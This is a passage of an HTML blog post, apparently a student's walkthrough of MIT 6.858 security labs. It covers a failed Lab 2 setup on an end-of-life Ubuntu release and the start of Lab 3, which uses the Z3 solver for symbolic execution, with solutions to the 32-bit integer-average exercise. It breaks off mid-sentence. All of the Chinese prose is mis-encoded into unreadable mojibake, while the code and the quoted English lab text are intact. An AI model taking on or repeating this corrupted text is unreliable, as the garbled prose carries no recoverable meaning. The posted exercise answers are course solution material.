main()<br></code></pre></td></tr></table></figure><p>é‡Œé¢å­˜åœ¨è¿™æ ·ä¸€ä¸ªè°ƒç”¨é“¾ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">boot()<br>Container.__init__()<br>    Container.make_container()<br>        Container.make_base()<br>            Container.configure_base()<br></code></pre></td></tr></table></figure><p>åœ¨ <code>configure_base()</code> ä¸­æœ‰ç€ä¸€ä¸ªè°ƒç”¨ <code>apt-get</code> çš„é€»è¾‘ï¼Œç”±äº <strong>Ubuntu 21.10 å·²ç» <a href="https://help.ubuntu.com/community/EOLUpgrades">EOL</a> äº†ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥æ˜¯å¿…ç„¶ä¼šå¤±è´¥çš„</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">configure_base</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># ...</span><br>    <span class="hljs-comment"># install packages for zoobar</span><br>    <span class="hljs-comment"># terminate early if anything goes wrong here</span><br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>], extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed updating apt package info&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;install&quot;</span>, <span class="hljs-string">&quot;-y&quot;</span>] + pkgs, extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed installing packages&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><blockquote><p>å‚è§ <a href="https://askubuntu.com/questions/1420190/upgrade-to-22-04-impish-release-no-longer-has-a-release-file">ask ubuntu</a> ä¸ <a href="https://fridge.ubuntu.com/2022/07/19/ubuntu-21-10-impish-indri-end-of-life-reached-on-july-14-2022/">Ubuntu Fridge</a></p><blockquote><p><s>ğŸ‘´çœŸçš„éº»äº†ï¼Œè¿™å®éªŒâ„¢æ˜¯ MIT ä»Šå¹´æ˜¥å­£å­¦æœŸå‘å¸ƒçš„ï¼Œç”¨ä¸ª 20.04 è¿™æ ·çš„ LTS ä¸å¥½ğŸï¼Œç”¨ä¸ªå°±åªå‰©å‡ ä¸ªğŸˆ·å¯¿å‘½çš„ 21.10 å°±ç¦»è°±</s></p></blockquote></blockquote><p>MIT ä¼°è®¡æ˜¯ä¸ä¼šä¿®è¿™ä¸ªé—®é¢˜äº†ï¼Œè€Œä¸‹ä¸€æ¬¡çš„å®éªŒæ‰‹å†Œå¾—ç­‰åˆ° 2023 å¹´çš„æ˜¥å­£å­¦æœŸæ‰èƒ½ä¸Šçº¿ï¼Œé‚£è¿™é‡Œç¬”è€…åªèƒ½è‡ªè¡Œå°è¯•è§£å†³è¿™ä¸ªé—®é¢˜äº†: (</p><p>è¿™é‡Œç¬”è€…è¯•äº†å¥½å‡ ç§æ–¹æ³•éƒ½æ²¡èƒ½æˆåŠŸå°† Ubuntu 21.10 å‡çº§æˆ 22.04 æˆ–æ˜¯å…¶ä»–çš„å¯ç”¨ç‰ˆæœ¬ï¼Œæœ€åç¬”è€…å°† <code>apt-get</code> æ›¿æ¢æˆ <code>apt</code> ä¹‹åå€’æ˜¯èƒ½è·‘äº†ï¼Œä¸è¿‡<strong>æ— æ³•æ­£å¸¸è®¿é—® zoobar æœåŠ¡å™¨</strong>ï¼Œä¼šæŠ¥ä¸€ä¸ª module not found ä½†æ˜¯å®é™…ä¸Šå·²ç»å®‰è£…æœ‰å¯¹åº”æ¨¡å—çš„é”™è¯¯ : (</p><blockquote><p>è¿™é‡Œå…ˆğŸ•Šäº†ï¼Œè¦æ˜¯ä¹‹åèƒ½é‡æ–°åšä¸Šå†è¡¥ï¼Œè¿˜å¥½å‡ ä¸ª lab ä¹‹é—´å¹¶éä¾èµ–å…³ç³»å¯ä»¥è®©ç¬”è€…å…ˆå¾€åç»§ç»­åš lab3 : )</p></blockquote><h1>0x03.Lab 3: Symbolic execution</h1><h2 id="Introduction-2">Introduction</h2><p>æœ¬ lab å°†æ•™å¤§å®¶ä½¿ç”¨ <strong>ç¬¦å·æ‰§è¡Œ</strong> ï¼ˆ<strong>symbolic execution</strong>ï¼‰ è¿™ä¸€å¼ºå¤§çš„æŠ€æœ¯æ¥å¯»æ‰¾è½¯ä»¶ä¸­çš„æ¼æ´ï¼Œåœ¨ lab çš„æœ€åæˆ‘ä»¬å°†å»ºç«‹ä¸€ä¸ªå¯ä»¥åœ¨ zoobar web åº”ç”¨ä¸­å¯»æ‰¾è§¦å‘å¤šç§æ¼æ´çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼ˆå‡†ç¡®çš„è¯´æ˜¯ä¸€ä¸ª<strong>æ··åˆæ‰§è¡Œ</strong>ï¼ˆconcolic executionï¼‰ç³»ç»Ÿï¼‰</p><blockquote><p>å…³äºä»€ä¹ˆæ˜¯ concolic executionï¼Œå¯ä»¥çœ‹è¿™å¼ å›¾</p><p><img src="https://s2.loli.net/2022/10/27/Fvl3yRNMnzKamfk.jpg" alt="concolic execution"></p></blockquote><p>åœ¨ <a href="http://css.csail.mit.edu/6.858/2022/readings/exe.pdf">EXE paper</a> ä¸­æè¿°äº†ä¸€ä¸ªç”¨äº C ç¨‹åºçš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼Œä¸ºäº†ç®€å•åŒ–ï¼Œè¯¥ lab å°†é€šè¿‡ä¿®æ”¹ Python å¯¹è±¡ä¸é‡è½½ç‰¹å®šæ–¹æ³•æ¥ä¸º Python ç¨‹åºå»ºç«‹ä¸€ä¸ªç¬¦å·/æ··åˆæ‰§è¡Œç³»ç»Ÿï¼Œç±»ä¼¼äº EXEï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ª SMT ï¼ˆ <a href="https://en.wikipedia.org/wiki/Satisfiability_Modulo_Theories">Satisfiability Modulo Theories</a>ï¼Œå¯æ»¡è¶³æ€§æ¨¡ç†è®ºï¼‰æ±‚è§£å™¨æ¥æ£€æŸ¥å¯æ»¡è¶³çš„çº¦æŸï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬çš„æ±‚è§£å™¨å¯ä»¥æ£€æŸ¥åŒæ—¶åŒ…å«ä¼ ç»Ÿå¸ƒå°”å¯æ»¡è¶³æ€§è¡¨è¾¾å¼ä¸æ¶‰åŠå…¶ä»–â€œç†è®ºâ€çš„çº¦æŸå¦‚æ•´å‹ã€ä½å‘é‡ã€å­—ç¬¦ä¸²ç­‰</p><p>æœ¬ lab åˆå§‹æˆ‘ä»¬é¦–å…ˆè¦é€šè¿‡è®¡ç®— 32 ä½æœ‰/æ— ç¬¦å·æ•°çš„å¹³å‡å€¼æ¥ç†Ÿæ‚‰ <strong>Z3</strong>â€”â€”ä¸€ä¸ªæµè¡Œçš„ SMT æ±‚è§£å™¨ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†ä¸º Python æ•´å‹æ“ä½œåˆ›å»º wrappersï¼ˆç±»ä¼¼ EXE æä¾›äº†ç¬¦å·å˜é‡ä¸Šçš„æ“ä½œç½®æ¢ï¼‰ï¼Œå¹¶åº”ç”¨è°ƒç”¨ Z3 çš„æ ¸å¿ƒé€»è¾‘æ¥æ¢ç´¢å¯èƒ½çš„ä¸åŒæ‰§è¡Œè·¯å¾„ï¼›æœ€ç»ˆæˆ‘ä»¬å°†æ¢ç´¢å¦‚ä½•å°†å…¶åº”ç”¨åœ¨ web åº”ç”¨ç¨‹åºä¸Šï¼Œä»¥å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ±‚è§£ï¼Œæˆ‘ä»¬å°†ä¸º Python çš„å­—ç¬¦ä¸²æ“ä½œå¥—ä¸€å±‚ wrapperï¼Œåœ¨ SQLalchemy æ•°æ®åº“æ¥å£ä¸Šåº”ç”¨å¯¹ç¬¦å·åŒ–å‹å¥½çš„ï¼ˆsymbolic-friendlyï¼‰wrapperï¼Œå¹¶ä½¿ç”¨è¿™ä¸ªç³»ç»Ÿå¯»æ‰¾ Zoobar ä¸­çš„æ¼æ´</p><blockquote><p>ä¸Šé¢ä¸¤æ®µéƒ½æ˜¯æŠ„å®éªŒæ‰‹å†Œçš„</p></blockquote><p>æ¥ä¸‹æ¥é¦–å…ˆè¿˜æ˜¯æƒ¯ä¾‹åœ°åˆ‡æ¢åˆ° lab 3 çš„åˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&#x27;lab2 completed&#x27;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab3 origin/lab3</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„ä¸è¦å°† lab 2 çš„ä»£ç åˆå¹¶åˆ° lab 3 é‡Œè¾¹ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿæ— æ³•é€šè¿‡ RPC è¿½è¸ªå¤šè¿›ç¨‹é—´çš„ç¬¦å·çº¦æŸï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä¸€ä¸ªæ²¡æœ‰è¿›è¡Œæƒé™åˆ†ç¦»çš„ Zoobar ä¸Šè¿›è¡Œç¬¦å·æ‰§è¡Œ</p><p>æ¥ä¸‹æ¥æ˜¯æ£€æŸ¥ä»£ç å¯ç”¨æ€§ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check</span><br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹å°±ğŸ†—ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç¬¦å·æ‰§è¡Œç³»ç»Ÿæ˜¯ CPU å¯†é›†å‹çš„ï¼Œå› æ­¤å¯¹äºä¸å¼€å¯ KVM æ”¯æŒçš„ QEMU è€Œè¨€ä¼šéå¸¸æ…¢ï¼š</p><p><img src="https://s2.loli.net/2022/12/12/AlWaHU6RhcE3TpN.png" alt="image.png">ã€</p><h2 id="Using-an-SMT-solver">Using an SMT solver</h2><p>ç¬¦å·æ‰§è¡Œçš„æ ¸å¿ƒæ˜¯ <strong>å¯æ»¡è¶³æ€§æ¨¡ç†è®ºæ±‚è§£å™¨</strong>ï¼ˆ<strong>Satisfiability Modulo Theory solver</strong>ï¼Œ å³ <code>SMT solver</code>ï¼‰ï¼Œåœ¨æœ¬ lab ä¸­æˆ‘ä»¬å°†ä½¿ç”¨å¾®è½¯å¼€å‘çš„ <a href="https://github.com/Z3Prover/z3">Z3 solver</a> çš„ Python-based APIï¼ˆå‚è§ <a href="https://ericpony.github.io/z3py-tutorial/">z3py tutorial</a> &amp; <a href="https://z3prover.github.io/api/html/namespacez3py.html">documentation for Z3â€™s Python API</a>ï¼‰ï¼Œå¹¶ä½¿ç”¨  <a href="https://rise4fun.com/z3/tutorialcontent/sequences">Z3â€™s support for strings</a>ï¼›æœ¬ Lab å¸¦æœ‰ä¸€ä¸ªæ„å»ºè‡ª <a href="https://github.com/Z3Prover/z3">Z3 github repo</a> çš„ Z3</p><p>å®éªŒæä¾›äº† <code>int-avg.py</code> ä½œä¸ºä½¿ç”¨ Z3 çš„ä¾‹å­ï¼š  <em>è®¡ç®—ä¸¤ä¸ª 32 ä½æ•´å‹çš„å¹³å‡å€¼</em>  ï¼Œä¸€ä¸ªæœ€ç®€å•çš„ç®—æ³•æ˜¯ <code>(x + y) / 2</code> ï¼Œä½†è¿™å¯èƒ½ä¼šå‘ç”Ÿ<strong>æ•´å‹ä¸Šæº¢</strong>ï¼Œä»è€Œå¾—åˆ°  <em>æ¨¡ 2<sup>32</sup></em> ä¸Šçš„å€¼ï¼ˆæƒ³äº†è§£æ›´å¤šï¼Œå‚è§  <a href="https://people.csail.mit.edu/nickolai/papers/wang-kint-2013-06-24.pdf">KINT paper</a> ï¼‰â€”â€”Z3 å¯ä»¥å¸®æˆ‘ä»¬æ£€æŸ¥è¿™ä¸ªé”™è¯¯ï¼šäºˆå…¶ä¸€ä¸ªå¸ƒå°”è¡¨è¾¾å¼ï¼ŒZ3 å¯ä»¥å‘Šè¯‰æˆ‘ä»¬å…¶<strong>æ˜¯å¦ä¸ºçœŸ</strong>ï¼ˆå³å¯ä»¥è¢«æ»¡è¶³ï¼‰ï¼›è‹¥è¡¨è¾¾å¼å¯ä»¥ä¸ºçœŸä¸”åŒ…å«ä¸€äº›å˜é‡ï¼ŒZ3 å¯ä»¥ç»™æˆ‘ä»¬ä¸€äº›ä½¿è¡¨è¾¾å¼ä¸ºçœŸçš„ğŸŒ°å˜é‡</p><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹è¿™ä»½ä»£ç ï¼ˆè¿™é‡Œä¸ä¼šä»”ç»†è®² Z3 çš„ç”¨æ³•ï¼Œä¸æ‡‚çš„ <a href="https://z3prover.github.io/api/html/">è‡ªè¡ŒæŸ¥æ–‡æ¡£</a>ï¼‰ï¼Œå…¶é¦–å…ˆä¼šä½¿ç”¨ Z3 åˆ›å»ºä¸¤ä¸ª 32 ä½çš„ä½å‘é‡ a ä¸ bï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> z3<br><br><span class="hljs-comment">## Construct two 32-bit integer values.  Do not change this code.</span><br>a = z3.BitVec(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">32</span>)<br>b = z3.BitVec(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">32</span>)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ†åˆ«è®¡ç®—æœ‰/æ— ç¬¦å·é™¤æ³•ä¸‹ä¸¤æ•°çš„å¹³å‡å€¼ï¼Œæ³¨æ„è¿™é‡Œ<strong>å¹¶æ²¡æœ‰å®é™…è¿›è¡Œè®¡ç®—ï¼Œè€Œä»…æ˜¯ä¿å­˜äº†ç¬¦å·å˜é‡è¡¨è¾¾å¼</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Compute the average of a and b.  The initial computation we provided</span><br><span class="hljs-comment">## naively adds them and divides by two, but that is not correct.  Modify</span><br><span class="hljs-comment">## these lines to implement your solution for both unsigned (u_avg) and</span><br><span class="hljs-comment">## signed (s_avg) division.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Watch out for the difference between signed and unsigned integer</span><br><span class="hljs-comment">## operations.  For example, the Z3 expression (x/2) performs signed</span><br><span class="hljs-comment">## division, meaning it treats the 32-bit value as a signed integer.</span><br><span class="hljs-comment">## Similarly, (x&gt;&gt;16) shifts x by 16 bits to the right, treating it</span><br><span class="hljs-comment">## as a signed integer.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Use z3.UDiv(x, y) for unsigned division of x by y.</span><br><span class="hljs-comment">## Use z3.LShR(x, y) for unsigned (logical) right shift of x by y bits.</span><br>u_avg = z3.UDiv(a + b, <span class="hljs-number">2</span>)<br>s_avg = (a + b) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>ç”±äº 32 ä½æ•´æ•°åŠ æ³•å¯èƒ½å­˜åœ¨æº¢å‡ºï¼Œæ•…è¿™é‡Œä¸ºäº†æ±‚å¾—å…¶æ­£ç¡®çš„å¹³å‡å€¼ï¼Œæˆ‘ä»¬å°†å…¶æ‰©å±•ä¸ºä¸¤ä¸ª 33 ä½çš„ä½å‘é‡ï¼Œå®Œæˆè®¡ç®—åå†æˆªæ–­å› 32 ä½ï¼ˆä¸ä¼šå¯¼è‡´ç»“æœé”™è¯¯ï¼Œå› ä¸º 32 ä½çš„å¹³å‡å€¼æ€»ä¼šåœ¨ 32 ä½å†…ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Do not change the code below.</span><br><br><span class="hljs-comment">## To compute the reference answers, we extend both a and b by one</span><br><span class="hljs-comment">## more bit (to 33 bits), add them, divide by two, and shrink back</span><br><span class="hljs-comment">## down to 32 bits.  You are not allowed to &quot;cheat&quot; in this way in</span><br><span class="hljs-comment">## your answer.</span><br>az33 = z3.ZeroExt(<span class="hljs-number">1</span>, a)<br>bz33 = z3.ZeroExt(<span class="hljs-number">1</span>, b)<br>real_u_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, z3.UDiv(az33 + bz33, <span class="hljs-number">2</span>))<br><br>as33 = z3.SignExt(<span class="hljs-number">1</span>, a)<br>bs33 = z3.SignExt(<span class="hljs-number">1</span>, b)<br>real_s_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, (as33 + bs33) / <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯æ±‚è§£æ˜¯å¦å­˜åœ¨èƒ½å¤Ÿå‘ç”Ÿæ•´å‹æº¢å‡ºçš„çº¦æŸï¼Œå³ï¼šæ˜¯å¦å­˜åœ¨è¿™æ ·çš„ä¸¤ä¸ª 32 ä½æ•´å‹å˜é‡å€¼ä½¿å¾—å…¶ 32 ä½ä¸‹è¿ç®—ç»“æœä¸ä¸çœŸå®è®¡ç®—ç»“æœç›¸ç­‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_val</span>(<span class="hljs-params">v, signed</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(v) == z3.BitVecNumRef:<br>        <span class="hljs-keyword">if</span> signed:<br>            v = v.as_signed_long()<br>        <span class="hljs-keyword">else</span>:<br>            v = v.as_long()<br>    <span class="hljs-keyword">return</span> v<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_model</span>(<span class="hljs-params">m, signed</span>):<br>    vals = &#123;&#125;<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> m:<br>        vals[k] = printable_val(m[k], signed)<br>    <span class="hljs-keyword">return</span> vals<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_check</span>(<span class="hljs-params">msg, signed, avg, real_avg</span>):<br>    e = (avg != real_avg)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Checking&quot;</span>, msg, <span class="hljs-string">&quot;using Z3 expression:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;    &quot;</span> + <span class="hljs-built_in">str</span>(e).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\n    &quot;</span>))<br>    solver = z3.Solver()<br>    solver.add(e)<br>    ok = solver.check()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Answer for %s: %s&quot;</span> % (msg, ok))<br><br>    <span class="hljs-keyword">if</span> ok == z3.sat:<br>        m = solver.model()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Example:&quot;</span>, printable_model(m, signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Your average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(avg), signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Real average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(real_avg), signed))<br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼ŒZ3 æ±‚è§£å™¨å¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°äº†è¿™æ ·çš„å€¼ï¼š</p><p><img src="https://s2.loli.net/2022/12/12/LekmYMWvfAUSNwy.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 1ï¼šé€šè¿‡ä¿®æ”¹  <code>int-avg.py</code> ä¸­çš„ <code>u_avg = ...</code> ä¸€è¡Œï¼Œå®ç°ä¸€ä¸ªæ­£ç¡®çš„å‡½æ•°ï¼Œä»¥åœ¨ 32 ä½è¿ç®—ä¸‹æ­£ç¡®è®¡ç®—å‡º a ä¸ b çš„æ— ç¬¦å·å¹³å‡å€¼ï¼Œä¸èƒ½æ”¹å˜æ“ä½œæ•°çš„ä½å®½</p><blockquote><p><strong>Exercise 1.</strong> Implement a correct function to compute the unsigned average of <code>a</code> and <code>b</code> using only 32-bit arithmetic, by modifying the <code>u_avg = ...</code> line in <code>int-avg.py</code>.</p><p>For the purposes of this exercise, you are not allowed to change the bit-widths of your operands. This is meant to represent the real world, where you cannot just add one more bit to your CPUâ€™s register width.</p><p>You may find it helpful to search online for correct ways to perform fixed-width integer arithmetic. The book <a href="https://web.archive.org/web/20190915025154/http://www.hackersdelight.org/">Hackerâ€™s Delight</a> by Henry S. Warren is a particularly good source of such tricks.</p><p>Check your averaging function by re-running <strong>./int-avg.py</strong> or <strong>make check</strong>. If your implementation is correct, <code>int-avg.py</code> should produce the message <code>Answer for unsigned avg: unsat</code>.</p></blockquote><p>è¿™é‡Œç¬”è€…ç»™å‡ºä¸€ä¸ªæ¯”è¾ƒç¬¨çš„è§£æ³•ï¼ˆæ¯•ç«Ÿç¬”è€…çš„è„‘å­:  (ä¹Ÿæƒ³ä¸å‡ºå•¥èªæ˜è§£æ³• ï¼‰ï¼š</p><ul><li><strong><code>(a / 2) + (b / 2) + ((a % 2) + (b % 2)) / 2</code></strong></li></ul><p>è¿™ä¸ªç®—æ³•çš„æ€è·¯æ¯”è¾ƒç®€å•ï¼Œæœ€åˆçš„å‡ºå‘ç‚¹å°±æ˜¯ä¸¤æ•°ä¹‹å’Œçš„å¹³å‡å€¼ä¸ä¼šè¶…å‡º 2<sup>32</sup>ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦å…ˆå°†ä¸¤æ•°åˆ†åˆ«é™¤ä»¥2å†ç›¸åŠ å°±ä¸ä¼šå‘ç”Ÿæº¢å‡ºäº†ï¼Œä½†æ˜¯å¥‡æ•°é™¤ä»¥2ä¼šä¸¢å¤± 0.5ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªæ•°éƒ½æ˜¯å¥‡æ•°çš„è¯æœ€åçš„ç»“æœä¼šä¸¢æ‰1ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å†å°†å…¶åŠ ä¸Šå³å¯</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ Z3 <strong>é»˜è®¤ä¸ºå¸¦ç¬¦å·è¿ç®—</strong>ï¼Œæ•…è¿™é‡Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>z3.UDiv()</code> æ¥è¿›è¡Œ<strong>æ— ç¬¦å·</strong>é™¤æ³•è¿ç®—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">u_avg = z3.UDiv(a, <span class="hljs-number">2</span>) + z3.UDiv(b, <span class="hljs-number">2</span>) + ((a % <span class="hljs-number">2</span>) + (b % <span class="hljs-number">2</span>)) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œ <code>make check</code>ï¼ŒæˆåŠŸé€šè¿‡ Exercise 1ï¼š</p><p><img src="https://s2.loli.net/2022/12/12/RhY7t1pxyVSb5eH.png" alt="image.png"></p><p>é™¤äº†è¿™ä¸ªç®—æ³•ä¹‹å¤–ï¼Œç¬”è€…è¿˜äº†è§£åˆ°æœ‰ä¸€ç§ç®—æ³•æ˜¯åˆ©ç”¨<strong>ä½è¿ç®—</strong>æ¥è¿›è¡Œè®¡ç®—ï¼š</p><ul><li><code>(a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li></ul><p>è¿™ä¸ªç®—æ³•çš„åŸºæœ¬åŸç†æ˜¯å…ˆæå–å‡º<strong>å…¬æœ‰éƒ¨åˆ†</strong>ï¼Œå†è®¡ç®—<strong>ç§æœ‰éƒ¨åˆ†çš„å¹³å‡å€¼</strong>ï¼Œæœ€åç›¸åŠ å³å¯å¾—åˆ°ç»“æœï¼›è¿™ä¸ªç®—æ³•ä¹Ÿèƒ½é€šè¿‡ Exercise 1 ï¼Œè¿™é‡Œå°±ä¸é‡å¤è´´å›¾äº†</p><p>æ¥ä¸‹æ¥æ˜¯ Challenge 1ï¼šé€šè¿‡ä¿®æ”¹  <code>int-avg.py</code> ä¸­çš„ <code>s_avg = ...</code> ä¸€è¡Œï¼Œå®ç°ä¸€ä¸ªæ­£ç¡®çš„å‡½æ•°ï¼Œä»¥åœ¨ 32 ä½è¿ç®—ä¸‹æ­£ç¡®è®¡ç®—å‡º a ä¸ b çš„<strong>æœ‰ç¬¦å·å¹³å‡å€¼</strong></p><blockquote><p><em>Challenge! (optional)</em> For extra credit, figure out how to compute the average of two 32-bit <em>signed</em> values. Modify the <code>s_avg = ...</code> line in <code>int-avg.py</code>, and run <strong>./int-avg.py</strong> or <strong>make check</strong> to check your answer. Keep in mind the direction of rounding: 3/2=1 and -3/2=-1, so so the average of 1 and 2 should be 1, and the average of -2 and -1 should be -1.</p><p>As you explore signed arithmetic, you may find it useful to know that Z3 has two different modulo-like operators. The first is signed modulo, which you get by using <code>a % b</code> in the Python Z3 API. Here, the sign of the result follows the sign of the divisor (i.e., <code>b</code>). For example, <code>-5 % 2 = 1</code>. The second is signed remainder, which you get by using <code>z3.SRem(a, b)</code>. Here, the sign of the result follows the sign of the dividend (i.e., <code>a</code>). With the same example inputs, <code>z3.SRem(-5, 2) = -1</code>.</p></blockquote><p>å¯¹äºå¸¦ç¬¦å·å€¼çš„è¿ç®—è€Œè¨€ï¼Œé™åˆ¶åœ¨ 32 ä½å†…çš„æ­£ç¡®è®¡ç®—ä¾¿æ²¡æœ‰é‚£ä¹ˆç®€å•äº†ï¼Œè‹¥æˆ‘ä»¬ç›´æ¥ç”¨ä¸Šé¢çš„å¼å­è¿›è¡Œè®¡ç®—åˆ™å¾ˆå®¹æ˜“è¢« Z3 æ‰¾åˆ°èƒ½å¯¼è‡´è¿ç®—ç»“æœé”™è¯¯çš„ä¾‹å­ï¼š</p><p><img src="https://s2.loli.net/2022/12/12/VMQFBdz4eICN9qg.png" alt="image.png"></p><p>ä¸ºä»€ä¹ˆåœ¨æœ‰ç¬¦å·é™¤æ³•ä¸‹è®¡ç®—å‡ºæ¥çš„ç»“æœä¸ä¸€è‡´å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºåœ¨é¢˜ç›®ä¸­<s>MIT éå¸¸SBåœ°</s>å¯¹äºæ­£æ•°é™¤æ³•å…¶é€‰æ‹©<strong>å‘ä¸‹å–æ•´</strong>ï¼Œå¯¹äºè´Ÿæ•°é™¤æ³•çš„æˆªæ–­ï¼Œå…¶é€‰æ‹©çš„æ˜¯<strong>å‘ä¸Šå–æ•´</strong>ï¼Œä½†æˆ‘ä»¬çš„ç®—æ³•æ˜¯<strong>æ­£æ•°ä¸è´Ÿæ•°çš†å‘ä¸‹å–æ•´</strong>ï¼Œå› æ­¤è®¡ç®—ç»“æœå°±å‡ºç°äº†åå·®</p><p>ç”±äºæ­£æ•°éƒ¨åˆ†æ²¡æœ‰é—®é¢˜ï¼Œå› 